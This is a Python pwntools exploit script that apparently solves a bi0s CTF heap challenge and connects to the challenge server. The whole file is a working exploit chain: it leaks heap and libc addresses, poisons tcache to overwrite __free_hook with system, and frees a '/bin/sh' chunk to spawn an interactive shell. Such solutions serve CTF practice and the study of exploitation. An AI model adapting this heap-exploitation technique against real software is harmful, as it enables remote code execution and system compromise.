from pwn import *
import sys

elf = ELF("./chall")
libc = ELF("./libc.so.6")

def conn():
    if sys.argv[1]=="1":
        # return process(elf.path)
        return process(elf.path, env={"LD_PRELOAD": libc.path})
    else:
        return remote("pwn.challenge.bi0s.in", 1234)



def add(length, data):
    p.sendlineafter(b"Choice >> ", b"1")
    p.sendlineafter(b"Enter length : ", str(length).encode())   # size < 0x60
    p.sendafter(b"Enter data : ", data)


def remove(idx, opt):
    p.sendlineafter(b"Choice >> ", b"2")
    p.sendlineafter(b"Enter index: ", str(idx).encode())
    p.sendlineafter(b"Which one?(1337 for all) ", str(opt).encode())

def link(to_idx, from_idx):
    p.sendlineafter(b"Choice >> ", b"3")
    p.sendlineafter(b"Enter to index: ", str(to_idx).encode())
    p.sendlineafter(b"Enter from index: ", str(from_idx).encode())

def unlink(idx, ofs, opt):
    p.sendlineafter(b"Choice >> ", b"4")
    p.sendlineafter(b"Enter index: ", str(idx).encode())
    p.recv()
    p.sendline(str(ofs).encode())
    p.sendlineafter(b"Do you want to keep it (y/n)? ", opt)


def exp():
    global p

    p = conn()
    #################################################
    # local
    # ofs_heap = 0x3f0
    # ofs_libc = 0x1ebbe0
    # ofs_malloc = 0x1ebb70
    # ofs_gadget = 0xe6c81

    # remote
    ofs_heap = 0x3f0
    ofs_libc = 0x1ebbe0
    ofs_malloc = 0x1ebb70
    ofs_gadget = 0xe6c81
    ofs_free = 0x1eeb28
    ofs_system = 0x55410

    #################################################3

    add(0x18, p64(0) + p64(0x511) + b"1"*8)
    add(0x18, b"B"*0x18)
    add(0x18, b"C"*0x18)
    add(0x18, b"E"*0x18)

    add(0x60, p64(0) + p64(0x111) + b"F"*0x20)
    add(0x60, b"E"*0x58)
    add(0x60, b"G"*0x58)
    add(0x60, b"E"*0x58)
    add(0x60, b"E"*0x58)
    
    
    link(0, 1)
    link(0, 2)
    link(0, 3)
    unlink(0, 3, b"y")
    add(0x28, b"D"*0x28)
    remove(1, 1337)
    # remove(2, 1)

    ##########################
    add(0x18, p64(0))
    link(0, 2)
    
    p.sendlineafter(b"Choice >> ", b"2")
    p.sendlineafter(b"Enter index: ", str(1).encode())
    p.recvuntil(b"Node 1 Offset 1 : ")

    heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
    log.info("heap_leak: %#x" % heap_leak) 

    p.sendlineafter(b"Which one?(1337 for all) ", str(1337).encode())

    #########################################3
    
    add(0x18, b"H"*0x10)
    remove(1, 1337)
    add(0x18, p64(heap_leak + 0x120) + p64(0x21) + p64(heap_leak - ofs_heap))

    link(4, 5)
    link(4, 6)
    link(4, 7)
    link(4, 8)

    link(4, 14)
    add(0x60, b"G"*0x50 + p64(0) + p64(0x31))
    add(0x60, b"G"*0x10 + p64(0) + p64(0x21) + b"C"*0x10)
    add(0x18, b"K"*0x10)

    # input("Starting...\n")
    remove(0, 3)

    #########################################
    remove(2, 1337)
    remove(3, 1337)

    add(0x18, b"2"*0x10)
    add(0x18, b"2"*0x10)

    link(5, 2)
    link(5, 3)

    unlink(5, 2, b"y")
    remove(2, 1337)

    
    add(0x18, p64(0) + p64(0x18) + p64(heap_leak - ofs_heap + 0x20))
    
    p.sendlineafter(b"Choice >> ", b"4")
    p.sendlineafter(b"Enter index: ", str(5).encode())
    p.recvuntil(b"Node 5 Offset 2 : ")
    libc_base = u64(p.recv(6).ljust(8, b"\x00")) - ofs_libc
    log.info("libc_base: %#x" % libc_base)
    p.sendlineafter(b"Enter offset: ", b"1")
    p.sendlineafter(b"Do you want to keep it (y/n)? ", b"n")

    gadget = libc_base + ofs_gadget
    system = libc_base + ofs_system

    ###########################################
    # add(0x60, b"3"*0x20)
    remove(1, 1337)
    add(0x18, b"5"*8)
    remove(1, 1337)

    add(0x18, p64(0) + p64(0x60) + p64(heap_leak + 0x80))
    remove(2, 1337)
    add(0x20, p64(0) + p64(0x71) + p64(libc_base + ofs_free))

    
    add(0x60, b"/bin/sh\x00")
    
    add(0x60, p64(system))

    input("Starting...\n")
    remove(3, 1337)
    # p.sendlineafter(b"Choice >> ", b"1")
    # p.sendlineafter(b"Enter length : ", str(0x18).encode())   # size < 0x60

    p.interactive()

exp()